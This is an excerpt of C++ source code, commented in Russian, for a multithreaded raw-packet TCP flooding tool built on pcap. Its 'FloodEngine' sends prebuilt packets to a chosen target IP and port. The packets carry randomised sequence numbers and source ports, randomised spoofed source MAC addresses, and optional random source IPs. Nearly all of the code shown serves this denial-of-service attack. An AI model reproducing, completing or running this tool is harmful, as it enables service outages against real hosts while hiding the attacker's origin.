...
// Принудительная упаковка структур без выравнивания
#pragma pack(push, 1)
struct ether_header {
...
public:
    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(iphdr) + sizeof(tcphdr);
    ...
    PrebuiltPacket(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac, uint16_t dst_port)
        ...
        tcphdr* tcp = (tcphdr*)(buffer + sizeof(ether_header) + sizeof(iphdr));
        tcp->source = 0;
        ...
        // Смещения для быстрой замены
        seq_offset = sizeof(ether_header) + sizeof(iphdr) + offsetof(tcphdr, seq);
        src_port_offset = sizeof(ether_header) + sizeof(iphdr) + offsetof(tcphdr, source);
    ...
    void set_seq(uint32_t seq) {
        memcpy(buffer + seq_offset, &seq, 4);
    }
    ...
    void set_src_ip(uint32_t ip) {
        src_ip = ip;  // обновляем поле для последующего расчета контрольной суммы
    ...
    void recalc_checksum() {
        ...
        psd.tcp_len = htons(sizeof(tcphdr));

        uint8_t pseudo_tcp_buf[sizeof(pseudo_header) + sizeof(tcphdr)];
        memcpy(pseudo_tcp_buf, &psd, sizeof(pseudo_header));
        memcpy(pseudo_tcp_buf + sizeof(pseudo_header), tcp, sizeof(tcphdr));

        tcp->check = checksum((uint16_t*)pseudo_tcp_buf, sizeof(pseudo_tcp_buf));
    }
};
...
public:
    FloodEngine(pcap_t* handle, uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac,
        ...
        : packet_template(src_ip, src_mac, dst_ip, dst_mac, dst_port),
    ...
    void start(int core_id) {
        ...
        // Инициализация seed для LCG (уникальный для потока)
        uint32_t seed = time(nullptr) + core_id * 1000;

        // Функция LCG (inline для скорости)
        ...
        while (!stop_flag.load(std::memory_order_relaxed)) {
            ...
            if (random_mac) {
                // Генерация случайного MAC (unicast: младший бит первого байта = 0)
                uint8_t mac[6];
                mac[0] = (lcg(seed) & 0xFE); // делаем чётным
                for (int i = 1; i < 6; ++i) {
                    mac[i] = lcg(seed) & 0xFF;
                }
            ...
            packet_template.set_src_port(port);

            uint32_t seq = lcg(seed);
            packet_template.set_seq(htonl(seq));
...
int main(int argc, char* argv[]) {
    if (argc < 6) {
        std::cerr << "Usage: " << argv[0]
                  ...
                  << "  src_ip      - source IP address (can be 0.0.0.0 if --random-ip is used, but interface will be auto-selected)\n"
                  << "  dst_ip      - target IP\n"
                  ...
                  << "Example: " << argv[0] << " 192.168.1.100 192.168.1.1 80 4 60 00:11:22:33:44:55 --random-ip --random-mac\n";
        return 1;
    }
    ...
    if (dst_port == 0) {
        std::cerr << "dst_port must be in range 1..65535\n";
        return 1;
    }
    if (num_threads <= 0) {
    ...
    for (int i = 6; i < argc; i++) {
        if (strcmp(argv[i], "--random-ip") == 0 || strcmp(argv[i], "--random-src") == 0) {
            random_ip = true;
    ...
    // Определяем имя интерфейса и исходный MAC
    std::string ifname;
    uint8_t src_mac[6] = {0}; // временный MAC

    if (src_ip != 0) {
        // Если IP задан, ищем интерфейс по этому IP
        ...
        if (!random_mac) {
            // Если MAC не случайный, получаем реальный MAC интерфейса
            if (!get_local_mac(src_ip, src_mac)) {
                std::cerr << "Could not get local MAC for IP " << argv[1] << std::endl;
                return 1;
            }
        } else {
            // MAC будет случайным, начальное значение не важно (позже перезапишется)
        }
    } else {
        // src_ip == 0: выбираем первый доступный интерфейс
        pcap_if_t *alldevs;
        if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1) {
        ...
        // MAC будет случайным, оставляем нули
    }

    // Открываем интерфейс для проверки типа линка
    ...
    // Создаём отдельные дескрипторы для каждого потока
